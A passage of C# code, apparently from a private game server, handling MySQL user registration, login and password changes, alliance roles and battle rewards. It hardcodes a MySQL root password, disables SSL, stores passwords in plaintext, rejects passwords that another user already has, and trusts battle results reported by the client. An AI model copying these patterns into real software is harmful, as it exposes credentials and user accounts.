            MySqlConnectionStringBuilder builder = new MySqlConnectionStringBuilder();
            builder.Server = "127.0.0.1";
            builder.UserID = "root";
            builder.Password = "*59.CJrcPW0jv3oy";
            builder.SslMode = MySqlSslMode.Disabled;
            builder.Database = Configuration.Instance.DatabaseName;
            builder.CharacterSet = "utf8mb4";

            JsonConvert.DefaultSettings = () => new JsonSerializerSettings
            {
                DefaultValueHandling = DefaultValueHandling.Ignore,
                NullValueHandling = NullValueHandling.Ignore
            };

            string connectionString = builder.ToString();

            bool success = false;

            try
            {
                using (MySqlConnection connection = new MySqlConnection(connectionString))
                {
                    connection.Open();

                    string query = "INSERT INTO users (username, password, id) VALUES (@username, @password, @id)";
                    MySqlCommand cmd = new MySqlCommand(query, connection);
                    cmd.Parameters.AddWithValue("@username", username);
                    cmd.Parameters.AddWithValue("@password", password);
                    cmd.Parameters.AddWithValue("@id", id);


                    int rowsAffected = cmd.ExecuteNonQuery();

                    if (rowsAffected > 0)
                    {
                        success = true;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }

            return success;
        }

        private bool IsUsernameOrPasswordTaken(string username, string password)
        {
            MySqlConnectionStringBuilder builder = new MySqlConnectionStringBuilder();
            builder.Server = "127.0.0.1";
            builder.UserID = "root";
            builder.Password = "";
            builder.SslMode = MySqlSslMode.Disabled;
            builder.Database = Configuration.Instance.DatabaseName;
            builder.CharacterSet = "utf8mb4";

            string connectionString = builder.ToString();
            bool isTaken = false;

            try
            {
                using (MySqlConnection connection = new MySqlConnection(connectionString))
                {
                    connection.Open();

                    string query = "SELECT COUNT(*) FROM users WHERE username = @username OR password = @password";
                    MySqlCommand cmd = new MySqlCommand(query, connection);
                    cmd.Parameters.AddWithValue("@username", username);
                    cmd.Parameters.AddWithValue("@password", password);

                    long count = (long)cmd.ExecuteScalar();

                    if (count > 0)
                    {
                        isTaken = true;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }

            return isTaken;
        }


        private string LoginUserFromDatabase(string username, string password)
        {
            string accountId = null;

            MySqlConnectionStringBuilder builder = new MySqlConnectionStringBuilder
            {
                Server = "127.0.0.1",
                UserID = "root",
                Password = "*59.CJrcPW0jv3oy",
                
                SslMode = MySqlSslMode.Disabled,
                Database = Configuration.Instance.DatabaseName,
                CharacterSet = "utf8mb4"
            };

            string connectionString = builder.ToString();

            try
            {
                Console.WriteLine("Starting database connection...");
                using (MySqlConnection connection = new MySqlConnection(connectionString))
                {
                    connection.Open();
                    Console.WriteLine("Database connection opened successfully.");

                    string query = "SELECT id FROM users WHERE username = @username AND password = @password";
                    using (MySqlCommand cmd = new MySqlCommand(query, connection))
                    {
                        Console.WriteLine("Preparing SQL command...");
                        cmd.Parameters.AddWithValue("@username", username);
                        cmd.Parameters.AddWithValue("@password", password);

                        Console.WriteLine("Executing SQL command...");
                        object result = cmd.ExecuteScalar();

                        if (result != null)
                        {
                            accountId = result.ToString();
                            Console.WriteLine($"User found. Account ID: {accountId}");
                        }
                        else
                        {
                            Console.WriteLine("No user found with the provided username and password.");
                        }
                    }
                }
            }
            catch (MySqlException sqlEx)
            {
                Console.WriteLine($"MySQL Exception: {sqlEx.Message}");
                Console.WriteLine($"Stack Trace: {sqlEx.StackTrace}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"General Exception: {ex.Message}");
                Console.WriteLine($"Stack Trace: {ex.StackTrace}");
            }
            finally
            {
                Console.WriteLine("Finished processing database login attempt.");
            }

            return accountId;
        }


        private string GetUsernameByAccountId(long accountId)
        {
            string username = null;

            MySqlConnectionStringBuilder builder = new MySqlConnectionStringBuilder();
            builder.Server = "127.0.0.1";
            builder.UserID = "root";
            builder.Password = "*59.CJrcPW0jv3oy";
            builder.SslMode = MySqlSslMode.Disabled;
            builder.Database = Configuration.Instance.DatabaseName;
            builder.CharacterSet = "utf8mb4";

            string connectionString = builder.ToString();

            try
            {
                using (MySqlConnection connection = new MySqlConnection(connectionString))
                {
                    connection.Open();

                    string query = "SELECT username FROM users WHERE id = @accountId";
                    MySqlCommand cmd = new MySqlCommand(query, connection);
                    cmd.Parameters.AddWithValue("@accountId", accountId);

                    object result = cmd.ExecuteScalar();

                    if (result != null)
                    {
                        username = result.ToString();
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }

            return username;
        }

        private bool ChangeUsernameInDatabase(long accountId, string newUsername)
        {
            bool success = false;

            MySqlConnectionStringBuilder builder = new MySqlConnectionStringBuilder();
            builder.Server = "127.0.0.1";
            builder.UserID = "root";
            builder.Password = "*59.CJrcPW0jv3oy";
            builder.SslMode = MySqlSslMode.Disabled;
            builder.Database = Configuration.Instance.DatabaseName;
            builder.CharacterSet = "utf8mb4";

            string connectionString = builder.ToString();

            try
            {
                using (MySqlConnection connection = new MySqlConnection(connectionString))
                {
                    connection.Open();

                    string query = "UPDATE users SET username = @newUsername WHERE id = @accountId";
                    MySqlCommand cmd = new MySqlCommand(query, connection);
                    cmd.Parameters.AddWithValue("@newUsername", newUsername);
                    cmd.Parameters.AddWithValue("@accountId", accountId);

                    int rowsAffected = cmd.ExecuteNonQuery();

                    success = rowsAffected > 0;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }

            return success;
        }

        private bool IsUsernameTaken(string newUsername)
        {
            bool isTaken = false;

            MySqlConnectionStringBuilder builder = new MySqlConnectionStringBuilder();
            builder.Server = "127.0.0.1";
            builder.UserID = "root";
            builder.Password = "*59.CJrcPW0jv3oy";
            builder.SslMode = MySqlSslMode.Disabled;
            builder.Database = Configuration.Instance.DatabaseName;
            builder.CharacterSet = "utf8mb4";

            string connectionString = builder.ToString();

            try
            {
                using (MySqlConnection connection = new MySqlConnection(connectionString))
                {
                    connection.Open();

                    string query = "SELECT COUNT(*) FROM users WHERE username = @newUsername";
                    MySqlCommand cmd = new MySqlCommand(query, connection);
                    cmd.Parameters.AddWithValue("@newUsername", newUsername);

                    object result = cmd.ExecuteScalar();

                    isTaken = Convert.ToInt32(result) > 0;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }

            return isTaken;
        }

        private bool VerifyOldPassword(string username, string oldPassword)
        {
            bool isValid = false;

            MySqlConnectionStringBuilder builder = new MySqlConnectionStringBuilder();
            builder.Server = "127.0.0.1";
            builder.UserID = "root";
            builder.Password = "*59.CJrcPW0jv3oy";
            builder.SslMode = MySqlSslMode.Disabled;
            builder.Database = Configuration.Instance.DatabaseName;
            builder.CharacterSet = "utf8mb4";

            string connectionString = builder.ToString();

            try
            {
                using (MySqlConnection connection = new MySqlConnection(connectionString))
                {
                    connection.Open();

                    string query = "SELECT COUNT(*) FROM users WHERE username = @username AND password = @oldPassword";
                    MySqlCommand cmd = new MySqlCommand(query, connection);
                    cmd.Parameters.AddWithValue("@username", username);
                    cmd.Parameters.AddWithValue("@oldPassword", oldPassword);

                    object result = cmd.ExecuteScalar();

                    isValid = Convert.ToInt32(result) > 0;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }

            return isValid;
        }

        private bool ChangeUserPasswordInDatabase(long accountId, string newPassword)
        {
            bool success = false;

            MySqlConnectionStringBuilder builder = new MySqlConnectionStringBuilder();
            builder.Server = "127.0.0.1";
            builder.UserID = "root";
            builder.Password = "*59.CJrcPW0jv3oy";
            builder.SslMode = MySqlSslMode.Disabled;
            builder.Database = Configuration.Instance.DatabaseName;
            builder.CharacterSet = "utf8mb4";

            string connectionString = builder.ToString();

            try
            {
                using (MySqlConnection connection = new MySqlConnection(connectionString))
                {
                    connection.Open();

                    string query = "UPDATE users SET password = @newPassword WHERE id = @accountId";
                    MySqlCommand cmd = new MySqlCommand(query, connection);
                    cmd.Parameters.AddWithValue("@newPassword", newPassword);
                    cmd.Parameters.AddWithValue("@accountId", accountId);

                    int rowsAffected = cmd.ExecuteNonQuery();

                    success = rowsAffected > 0;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }

            return success;
        }

        private void ChangeAllianceMemberRoleReceived(ChangeAllianceMemberRoleMessage message)
        {
            if (HomeMode.Avatar.AllianceId <= 0) return;
            if (HomeMode.Avatar.AllianceRole == AllianceRole.Member || HomeMode.Avatar.AllianceRole == AllianceRole.None) return;

            Alliance alliance = Alliances.Load(HomeMode.Avatar.AllianceId);
            if (alliance == null) return;

            AllianceMember member = alliance.GetMemberById(message.AccountId);
            if (member == null) return;

            ClientAvatar avatar = Accounts.Load(message.AccountId).Avatar;

            AllianceRole None = 0,
                    Member = (AllianceRole)1,
                    Leader = (AllianceRole)2,
                    Elder = (AllianceRole)3,
                    CoLeader = (AllianceRole)4;
            if (HomeMode.Avatar.AllianceRole == (AllianceRole)Member) return;
            //if (member.Role == Leader) return;
            if (alliance.getRoleVector(member.Role, (AllianceRole)message.Role))
            {
                if (avatar.AllianceRole == (AllianceRole)Member)
                {
                    avatar.AllianceRole = (AllianceRole)Elder;
                }
                else if (avatar.AllianceRole == (AllianceRole)Elder)
                {
                    avatar.AllianceRole = (AllianceRole)CoLeader;
                }
                else if (avatar.AllianceRole == (AllianceRole)CoLeader)
                {
                    HomeMode.Avatar.AllianceRole = (AllianceRole)CoLeader;
                    avatar.AllianceRole = (AllianceRole)Leader;
                    AllianceStreamEntry entry2 = new()
                    {
                        AuthorId = HomeMode.Avatar.AccountId,
                        AuthorName = HomeMode.Avatar.Name,
                        Id = ++alliance.Stream.EntryIdCounter,
                        PlayerId = HomeMode.Avatar.AccountId,
                        PlayerName = HomeMode.Avatar.Name,
                        Type = 4,
                        Event = 6,
                        AuthorRole = HomeMode.Avatar.AllianceRole
                    };
                    alliance.AddStreamEntry(entry2);

                    AllianceMember me = alliance.GetMemberById(HomeMode.Avatar.AccountId);
                    me.Role = HomeMode.Avatar.AllianceRole;

                }
                member.Role = avatar.AllianceRole;

                AllianceStreamEntry entry = new()
                {
                    AuthorId = HomeMode.Avatar.AccountId,
                    AuthorName = HomeMode.Avatar.Name,
                    Id = ++alliance.Stream.EntryIdCounter,
                    PlayerId = avatar.AccountId,
                    PlayerName = avatar.Name,
                    Type = 4,
                    Event = 5,
                    AuthorRole = HomeMode.Avatar.AllianceRole
                };
                alliance.AddStreamEntry(entry);

                AllianceResponseMessage response = new()
                {
                    ResponseType = 81
                };
                Connection.Send(response);
                MyAllianceMessage myAlliance = new()
                {
                    AllianceHeader = alliance.Header,
                    Role = HomeMode.Avatar.AllianceRole
                };
                Connection.Send(myAlliance);
                if (LogicServerListener.Instance.IsPlayerOnline(avatar.AccountId))
                {
                    LogicServerListener.Instance.GetGameListener(avatar.AccountId).SendTCPMessage(new AllianceResponseMessage()
                    {
                        ResponseType = 101
                    });
                    MyAllianceMessage targetAlliance = new()
                    {
                        AllianceHeader = alliance.Header,
                        Role = avatar.AllianceRole
                    };
                    LogicServerListener.Instance.GetGameListener(avatar.AccountId).SendTCPMessage(targetAlliance);
                }
            }
            else
            {
                if (avatar.AllianceRole == (AllianceRole)Elder)
                {
                    avatar.AllianceRole = (AllianceRole)Member;
                }
                else if (avatar.AllianceRole == (AllianceRole)CoLeader)
                {
                    avatar.AllianceRole = (AllianceRole)Elder;
                }
                member.Role = avatar.AllianceRole;

                AllianceStreamEntry entry = new()
                {
                    AuthorId = HomeMode.Avatar.AccountId,
                    AuthorName = HomeMode.Avatar.Name,
                    Id = ++alliance.Stream.EntryIdCounter,
                    PlayerId = avatar.AccountId,
                    PlayerName = avatar.Name,
                    Type = 4,
                    Event = 6,
                    AuthorRole = HomeMode.Avatar.AllianceRole
                };
                alliance.AddStreamEntry(entry);

                AllianceResponseMessage response = new()
                {
                    ResponseType = 82
                };
                Connection.Send(response);
                MyAllianceMessage myAlliance = new()
                {
                    AllianceHeader = alliance.Header,
                    Role = HomeMode.Avatar.AllianceRole
                };
                Connection.Send(myAlliance);
                if (LogicServerListener.Instance.IsPlayerOnline(avatar.AccountId))
                {
                    LogicServerListener.Instance.GetGameListener(avatar.AccountId).SendTCPMessage(new AllianceResponseMessage()
                    {
                        ResponseType = 102
                    });
                    MyAllianceMessage targetAlliance = new()
                    {
                        AllianceHeader = alliance.Header,
                        Role = avatar.AllianceRole
                    };
                    LogicServerListener.Instance.GetGameListener(avatar.AccountId).SendTCPMessage(targetAlliance);
                }
            }
        }



        private void ClientCapabilitesReceived(ClientCapabilitiesMessage message)
        {
            Connection.PingUpdated(message.Ping);
            ShowLobbyInfo();
        }

        private void AskForBattleEndReceived(AskForBattleEndMessage message)
        {
            Console.WriteLine("AskForBattleEndMessage");
            Console.WriteLine("BattleResult:" + message.BattleResult);
            Console.WriteLine("Rank:" + message.Rank);
            Console.WriteLine("LocationId:" + message.LocationId);
            Console.WriteLine("BattlePlayersCount:" + message.BattlePlayersCount);
            foreach (var player in message.BattlePlayers)
            {
                Console.WriteLine($"CharacterId: {player.CharacterId}, SkinId: {player.SkinId}, TeamIndex: {player.TeamIndex}, Bot: {player.IsBot}, DisplayDataName: {player.DisplayData.Name}");
            }


            bool isPvP;
            BattlePlayer OwnPlayer = null;

            LocationData location = DataTables.Get(DataType.Location).GetDataWithId<LocationData>(message.LocationId);
            if (location == null || location.Disabled)
            {
                return;
            }
            if (DateTime.UtcNow > HomeMode.Home.PremiumEndTime && HomeMode.Avatar.PremiumLevel > 1)
            {
                HomeMode.Avatar.PremiumLevel = 0;
                long timestamp = DateTime.Now.Ticks / TimeSpan.TicksPerSecond;
                int timestamps = Convert.ToInt32(timestamp % int.MaxValue);
                HomeMode.Home.NotificationFactory.Add(new Notification
                {
                    Id = 81,
                    //TimePassed = Convert.ToInt32(timestamps),
                    MessageEntry = $"Merhaba, vip süreniz bitmiştir."
                });
            }

            isPvP = true;//Events.HasLocation(message.LocationId);

            for (int x = 0; x < message.BattlePlayersCount; x++)
            {
                BattlePlayer battlePlayer = message.BattlePlayers[x];
                if (battlePlayer.DisplayData.Name == HomeMode.Avatar.Name)
                {
                    battlePlayer.AccountId = HomeMode.Avatar.AccountId;
                    OwnPlayer = battlePlayer;

                    Hero hero = HomeMode.Avatar.GetHero(OwnPlayer.CharacterId);
                    if (hero == null)
                    {
                        return;
                    }
                    message.BattlePlayers[x].HeroPowerLevel = hero.PowerLevel + (hero.HasStarpower ? 1 : 0);
                    OwnPlayer.HeroPowerLevel = hero.PowerLevel + (hero.HasStarpower ? 1 : 0);
                    OwnPlayer.Trophies = hero.Trophies;
                    OwnPlayer.HighestTrophies = hero.HighestTrophies;
                    OwnPlayer.PowerPlayScore = HomeMode.Home.PowerPlayScore;

                    battlePlayer.DisplayData = new PlayerDisplayData(HomeMode.Home.HasPremiumPass, HomeMode.Home.ThumbnailId, HomeMode.Home.NameColorId, HomeMode.Avatar.Name);
                }
                else
                {
                    battlePlayer.DisplayData = new PlayerDisplayData(false, 28000000, 43000000, "Bot " + battlePlayer.DisplayData.Name);
                }
            }

            if (OwnPlayer == null)
            {
                return;
            }

            int StartExperience = HomeMode.Home.Experience;
            int[] ExperienceRewards = new[] { 8, 4, 6 };
            int[] TokensRewards = new[] { 14, 7, 10 };

            bool starToken = false;
            int gameMode = 0;
            int[] Trophies = new int[10];
            int trophiesResult = 0;
            int underdogTrophiesResult = 0;
            int experienceResult = 0;
            int totalTokensResult = 0;
            int tokensResult = 0;
            int doubledTokensResult = 0;
            int MilestoneReward = 0;
            int starExperienceResult = 0;
            List<int> MilestoneRewards = new List<int>();
            int powerPlayScoreGained = 0;
            int powerPlayEpicScoreGained = 0;
            bool isPowerPlay = false;
            bool HasNoTokens = false;
            List<Quest> q = new();

            if (isPvP)
            {
                Hero hero = HomeMode.Avatar.GetHero(OwnPlayer.CharacterId);
                if (hero == null)
                {
                    return;
                }
                int slot = Events.SlotsLocations[message.LocationId];

                int brawlerTrophies = hero.Trophies;
                if (slot == 9)
                {
                    if (HomeMode.Home.PowerPlayGamesPlayed < 3)
                    {
                        isPvP = false;
                        isPowerPlay = true;
                        int[] powerPlayAwards = { 30, 5, 15 };
                        powerPlayScoreGained = powerPlayAwards[message.BattleResult];
                        HomeMode.Home.PowerPlayTrophiesReward = powerPlayScoreGained;
                        HomeMode.Home.PowerPlayGamesPlayed++;
                        HomeMode.Home.PowerPlayScore += powerPlayScoreGained;

                        HomeMode.Avatar.TrioWins++;
                        if (location.GameMode == "CoinRush")
                        {
                            if (DateTime.UtcNow.Subtract(HomeMode.Avatar.BattleStartTime).TotalSeconds <= 90)
                            {
                                HomeMode.Home.PowerPlayTrophiesReward += 0;
                                HomeMode.Home.PowerPlayScore += 0;
                                powerPlayEpicScoreGained = 0;
                            }
                        }
                        else if (location.GameMode == "LaserBall")
                        {
                            if (DateTime.UtcNow.Subtract(HomeMode.Avatar.BattleStartTime).TotalSeconds <= 30)
                            {
                                HomeMode.Home.PowerPlayTrophiesReward += 0;
                                HomeMode.Home.PowerPlayScore += 0;
                                powerPlayEpicScoreGained = 0;
                            }
                        }
                        else if (location.GameMode == "AttackDefend")
                        {
                            if (DateTime.UtcNow.Subtract(HomeMode.Avatar.BattleStartTime).TotalSeconds <= 45)
                            {
                                HomeMode.Home.PowerPlayTrophiesReward += 0;
                                HomeMode.Home.PowerPlayScore += 0;
                                powerPlayEpicScoreGained = 0;
                            }
                        }
                        else if (location.GameMode == "RoboWars")
                        {
                            if (DateTime.UtcNow.Subtract(HomeMode.Avatar.BattleStartTime).TotalSeconds <= 45)
                            {
                                HomeMode.Home.PowerPlayTrophiesReward += 0;
                                HomeMode.Home.PowerPlayScore += 0;
                                powerPlayEpicScoreGained = 0;
                            }
                        }
                        if (HomeMode.Home.PowerPlayScore >= HomeMode.Home.PowerPlayHighestScore)
                        {
                            HomeMode.Home.PowerPlayHighestScore = HomeMode.Home.PowerPlayScore;
                        }
                        if (HomeMode.Home.Quests != null)
                        {
                            if (location.GameMode == "BountyHunter")
                            {
                                q = HomeMode.Home.Quests.UpdateQuestsProgress(3, OwnPlayer.CharacterId, 0, 0, 0, HomeMode.Home);
                            }
                            else if (location.GameMode == "CoinRush")
                            {
                                q = HomeMode.Home.Quests.UpdateQuestsProgress(0, OwnPlayer.CharacterId, 0, 0, 0, HomeMode.Home);
                            }
                            else if (location.GameMode == "AttackDefend")
                            {
                                q = HomeMode.Home.Quests.UpdateQuestsProgress(2, OwnPlayer.CharacterId, 0, 0, 0, HomeMode.Home);
                            }
                            else if (location.GameMode == "LaserBall")
                            {
                                q = HomeMode.Home.Quests.UpdateQuestsProgress(5, OwnPlayer.CharacterId, 0, 0, 0, HomeMode.Home);
                            }
                            else if (location.GameMode == "RoboWars")
                            {
                                q = HomeMode.Home.Quests.UpdateQuestsProgress(11, OwnPlayer.CharacterId, 0, 0, 0, HomeMode.Home);
                            }
                        }
                    }


                }
                else if (location.GameMode == "BountyHunter" || location.GameMode == "CoinRush" || location.GameMode == "AttackDefend" || location.GameMode == "LaserBall" || location.GameMode == "RoboWars" || location.GameMode == "KingOfHill")
                {
                    if (message.BattleResult == 0)
                    {
                        OwnPlayer.isStarplayer = true;
                        starExperienceResult = 4;
                        HomeMode.Home.Experience += starExperienceResult;
                        /*if (Events.PlaySlot(HomeMode.Avatar.AccountId, slot))
                        {
                            starToken = true;
                            HomeMode.Avatar.AddStarTokens(1);
                            HomeMode.Home.StarTokensReward = 1;
                        }*/
                    }
                    else
                    {
                        Random r = new();
                        message.BattlePlayers[r.Next(1, 5)].isStarplayer = true;
                    }
                    if (brawlerTrophies <= 49)
                    {
                        Trophies[0] = 8;
                        Trophies[1] = 0;
                    }
                    else if (50 <= brawlerTrophies && brawlerTrophies <= 99)
                    {
                        Trophies[0] = 8;
                        Trophies[1] = -1;
                    }
                    else if (100 <= brawlerTrophies && brawlerTrophies <= 199)
                    {
                        Trophies[0] = 8;
                        Trophies[1] = -2;
                    }
                    else if (200 <= brawlerTrophies && brawlerTrophies <= 299)
                    {
                        Trophies[0] = 8;
                        Trophies[1] = -3;
                    }
                    else if (300 <= brawlerTrophies && brawlerTrophies <= 399)
                    {
                        Trophies[0] = 8;
                        Trophies[1] = -4;
                    }
                    else if (400 <= brawlerTrophies && brawlerTrophies <= 499)
                    {
                        Trophies[0] = 8;
                        Trophies[1] = -5;
                    }
                    else if (500 <= brawlerTrophies && brawlerTrophies <= 599)
                    {
                        Trophies[0] = 8;
                        Trophies[1] = -6;
                    }
                    else if (600 <= brawlerTrophies && brawlerTrophies <= 699)
                    {
                        Trophies[0] = 8;
                        Trophies[1] = -7;
                    }
                    else if (700 <= brawlerTrophies && brawlerTrophies <= 799)
                    {
                        Trophies[0] = 8;
                        Trophies[1] = -8;
                    }
                    else if (800 <= brawlerTrophies && brawlerTrophies <= 899)
                    {
                        Trophies[0] = 7;
                        Trophies[1] = -9;
                    }
                    else if (900 <= brawlerTrophies && brawlerTrophies <= 999)
                    {
                        Trophies[0] = 6;
                        Trophies[1] = -10;
                    }
                    else if (1000 <= brawlerTrophies && brawlerTrophies <= 1099)
                    {
                        Trophies[0] = 5;
                        Trophies[1] = -11;
                    }
                    else if (1100 <= brawlerTrophies && brawlerTrophies <= 1199)
                    {
                        Trophies[0] = 4;
                        Trophies[1] = -12;
                    }
                    else if (brawlerTrophies >= 1200)
                    {
                        Trophies[0] = 3;
                        Trophies[1] = -12;
                    }

                    gameMode = 1;
                    trophiesResult = Trophies[message.BattleResult];
                    HomeMode.Home.TrophiesReward = Math.Max(trophiesResult, 0);

                    if (message.BattleResult == 0) // Win
                    {
                        HomeMode.Avatar.TrioWins++;
                        if (location.GameMode == "CoinRush")
                        {
                            Console.WriteLine(DateTime.UtcNow.Subtract(HomeMode.Avatar.BattleStartTime).TotalSeconds);
                            if (DateTime.UtcNow.Subtract(HomeMode.Avatar.BattleStartTime).TotalSeconds <= 90)
                            {
                                //underdogTrophiesResult += 0;//(int)Math.Round((double)Trophies[message.BattleResult] / 4);
                                //trophiesResult += underdogTrophiesResult;
                                HomeMode.Home.TrophiesReward = Math.Max(trophiesResult, 0);
                            }
                        }
                        else if (location.GameMode == "LaserBall")
                        {
                            Console.WriteLine(DateTime.UtcNow.Subtract(HomeMode.Avatar.BattleStartTime).TotalSeconds);
                            if (DateTime.UtcNow.Subtract(HomeMode.Avatar.BattleStartTime).TotalSeconds <= 30)
                            {
                                //underdogTrophiesResult += 0;//(int)Math.Round((double)Trophies[message.BattleResult] / 4);
                                //trophiesResult += underdogTrophiesResult;
                                HomeMode.Home.TrophiesReward = Math.Max(trophiesResult, 0);
                            }
                        }

                        if (HomeMode.Home.Quests != null)
                        {
                            if (location.GameMode == "BountyHunter")
                            {
                                q = HomeMode.Home.Quests.UpdateQuestsProgress(3, OwnPlayer.CharacterId, 0, 0, 0, HomeMode.Home);
                            }
                            else if (location.GameMode == "CoinRush")
                            {
                                q = HomeMode.Home.Quests.UpdateQuestsProgress(0, OwnPlayer.CharacterId, 0, 0, 0, HomeMode.Home);
                            }
                            else if (location.GameMode == "AttackDefend")
                            {
                                q = HomeMode.Home.Quests.UpdateQuestsProgress(2, OwnPlayer.CharacterId, 0, 0, 0, HomeMode.Home);
                            }
                            else if (location.GameMode == "LaserBall")
                            {
                                q = HomeMode.Home.Quests.UpdateQuestsProgress(5, OwnPlayer.CharacterId, 0, 0, 0, HomeMode.Home);
                            }
                            else if (location.GameMode == "RoboWars")
                            {
                                q = HomeMode.Home.Quests.UpdateQuestsProgress(11, OwnPlayer.CharacterId, 0, 0, 0, HomeMode.Home);
                            }
                        }

                    }

                    tokensResult = TokensRewards[message.BattleResult];
                    totalTokensResult = tokensResult;

                    experienceResult = ExperienceRewards[message.BattleResult];
                    HomeMode.Home.Experience += experienceResult;
                }
                else if (location.GameMode == "BattleRoyale")
                {
                    if (message.Rank < 5)
                    {
                        /*if (Events.PlaySlot(HomeMode.Avatar.AccountId, slot))
                        {
                            starToken = true;
                            HomeMode.Avatar.AddStarTokens(1);
                            HomeMode.Home.StarTokensReward = 1;
                        }*/
                    }
                    if (brawlerTrophies >= 0 && brawlerTrophies <= 49)
                    {
                        Trophies = new[] { 10, 8, 7, 6, 4, 2, 2, 1, 0, 0 };
                    }
                    else if (brawlerTrophies >= 50 && brawlerTrophies <= 99)
                    {
                        Trophies = new[] { 10, 8, 7, 6, 3, 2, 2, 0, -1, -2 };
                    }
                    else if (brawlerTrophies >= 100 && brawlerTrophies <= 199)
                    {
                        Trophies = new[] { 10, 8, 7, 6, 3, 1, 0, -1, -2, -2 };
                    }
                    else if (brawlerTrophies >= 200 && brawlerTrophies <= 299)
                    {
                        Trophies = new[] { 10, 8, 6, 5, 3, 1, 0, -2, -3, -3 };
                    }
                    else if (brawlerTrophies >= 300 && brawlerTrophies <= 399)
                    {
                        Trophies = new[] { 10, 8, 6, 5, 2, 0, 0, -3, -4, -4 };
                    }
                    else if (brawlerTrophies >= 400 && brawlerTrophies <= 499)
                    {
                        Trophies = new[] { 10, 8, 6, 5, 2, -1, -2, -3, -5, -5 };
                    }
                    else if (brawlerTrophies >= 500 && brawlerTrophies <= 599)
                    {
                        Trophies = new[] { 10, 8, 6, 4, 2, -1, -2, -5, -6, -6 };
                    }
                    else if (brawlerTrophies >= 600 && brawlerTrophies <= 699)
                    {
                        Trophies = new[] { 10, 8, 6, 4, 1, -2, -2, -5, -7, -8 };
                    }
                    else if (brawlerTrophies >= 700 && brawlerTrophies <= 799)
                    {
                        Trophies = new[] { 10, 8, 6, 4, 1, -3, -4, -5, -8, -9 };
                    }
                    else if (brawlerTrophies >= 800 && brawlerTrophies <= 899)
                    {
                        Trophies = new[] { 9, 7, 5, 2, 0, -3, -4, -7, -9, -10 };
                    }
                    else if (brawlerTrophies >= 900 && brawlerTrophies <= 999)
                    {
                        Trophies = new[] { 8, 6, 4, 1, -1, -3, -6, -8, -10, -11 };
                    }
                    else if (brawlerTrophies >= 1000 && brawlerTrophies <= 1099)
                    {
                        Trophies = new[] { 6, 5, 3, 1, -2, -5, -6, -9, -11, -12 };
                    }
                    else if (brawlerTrophies >= 1100 && brawlerTrophies <= 1199)
                    {
                        Trophies = new[] { 5, 4, 1, 0, -2, -6, -7, -10, -12, -13 };
                    }
                    else if (brawlerTrophies >= 1200)
                    {
                        Trophies = new[] { 5, 3, 0, -1, -2, -6, -8, -11, -12, -13 };
                    }

                    gameMode = 2;
                    trophiesResult = Trophies[message.Rank - 1];

                    ExperienceRewards = new[] { 15, 12, 9, 6, 5, 4, 3, 2, 1, 0 };
                    TokensRewards = new[] { 30, 24, 21, 15, 12, 8, 6, 4, 2, 0 };



                    HomeMode.Home.TrophiesReward = Math.Max(trophiesResult, 0);

                    if (message.Rank == 1) // Win
                    {
                        HomeMode.Avatar.SoloWins++;
                    }
                    if (message.Rank < 5 && HomeMode.Home.Quests != null)
                        q = HomeMode.Home.Quests.UpdateQuestsProgress(6, OwnPlayer.CharacterId, 0, 0, 0, HomeMode.Home);
                    tokensResult = TokensRewards[message.Rank - 1];
                    totalTokensResult = tokensResult;

                    experienceResult = ExperienceRewards[message.Rank - 1];
                    HomeMode.Home.Experience += experienceResult;
                }
                else if (location.GameMode == "BattleRoyaleTeam")
                {
                    if (message.Rank < 3)
                    {
                        /*if (Events.PlaySlot(HomeMode.Avatar.AccountId, slot))
                        {
                            starToken = true;
                            HomeMode.Avatar.AddStarTokens(1);
                            HomeMode.Home.StarTokensReward = 1;
                        }*/
                    }
                    if (brawlerTrophies >= 0 && brawlerTrophies <= 49)
                    {
                        Trophies[0] = 9;
                        Trophies[1] = 7;
                        Trophies[2] = 4;
                        Trophies[3] = 0;
                        Trophies[4] = 0;
                    }
                    else if (brawlerTrophies <= 999)
                    {
                        Trophies[0] = 9;
                        Trophies[1] = 7;
                        int rankDiff = (brawlerTrophies - 100) / 100;
                        Trophies[2] = Math.Max(3 - rankDiff, 0);
                        Trophies[3] = Math.Max(-1 - rankDiff, -3);
                        Trophies[4] = Math.Max(-2 - rankDiff, -4);
                    }
                    else if (brawlerTrophies <= 1099)
                    {
                        Trophies[0] = 5;
                        Trophies[1] = 4;
                        int rankDiff = (brawlerTrophies - 1000) / 100;
                        Trophies[2] = Math.Max(-4 - rankDiff, -6);
                        Trophies[3] = Math.Max(-9 - rankDiff, -10);
                        Trophies[4] = Math.Max(-11 - rankDiff, -12);
                    }
                    else
                    {
                        Trophies[0] = 4;
                        Trophies[1] = 2;
                        Trophies[2] = -6;
                        Trophies[3] = -10;
                        Trophies[4] = -12;
                    }

                    gameMode = 5;
                    trophiesResult = Trophies[message.Rank - 1];

                    ExperienceRewards = new[] { 14, 8, 4, 2, 0 };
                    TokensRewards = new[] { 32, 20, 8, 4, 0 };

                    HomeMode.Home.TrophiesReward = Math.Max(trophiesResult, 0);

                    if (message.Rank < 3) // Win
                    {
                        HomeMode.Avatar.DuoWins++;
                    }
                    if (message.Rank < 3 && HomeMode.Home.Quests != null)
                        q = HomeMode.Home.Quests.UpdateQuestsProgress(9, OwnPlayer.CharacterId, 0, 0, 0, HomeMode.Home);
                    tokensResult = TokensRewards[message.Rank - 1];
                    totalTokensResult = tokensResult;

                    experienceResult = ExperienceRewards[message.Rank - 1];
                    HomeMode.Home.Experience += experienceResult;
                }

                else if (location.GameMode == "BossFight")
                {
                    gameMode = 4;
                }
                else if (location.GameMode == "Raid_TownCrush")
                {
                    isPvP = false;
                    Console.WriteLine(message.BattleResult);
                    message.BattleResult = 0;
                    gameMode = 6;
                }
                else if (location.GameMode == "Raid")
                {
                    isPvP = false;
                    message.BattleResult = 0;
                    gameMode = 6;
                }

                underdogTrophiesResult += (int)Math.Floor((double)Trophies[0] / 2);
                trophiesResult += underdogTrophiesResult;
                HomeMode.Home.TrophiesReward = Math.Max(trophiesResult, 0);
                if (HomeMode.Avatar.PremiumLevel > 0)
                {
